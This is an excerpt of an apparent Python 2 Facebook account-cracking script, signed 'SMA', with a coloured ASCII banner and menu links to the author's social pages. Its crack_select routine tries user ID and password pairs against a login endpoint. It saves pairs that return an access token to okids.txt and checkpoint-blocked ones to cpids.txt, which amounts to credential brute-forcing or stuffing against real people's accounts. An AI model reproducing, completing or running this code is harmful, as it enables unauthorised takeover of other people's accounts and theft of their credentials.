...
\033[1;92m\n.d8888. .88b  d88.  .d8b.  
88'  YP 88'YbdP`88 d8' `8b 
`8bo.   88  88  88 88ooo88 
  `Y8b. 88  88  88 88~~~88 
...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: SMA
\033[1;92mFb \033[1;93m: Saeed Anwar
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100053717036673')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtube.com/channel/UCUEyn-dE8rc3ub_uLfnfQXQ')
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[SMA-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[SMA-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
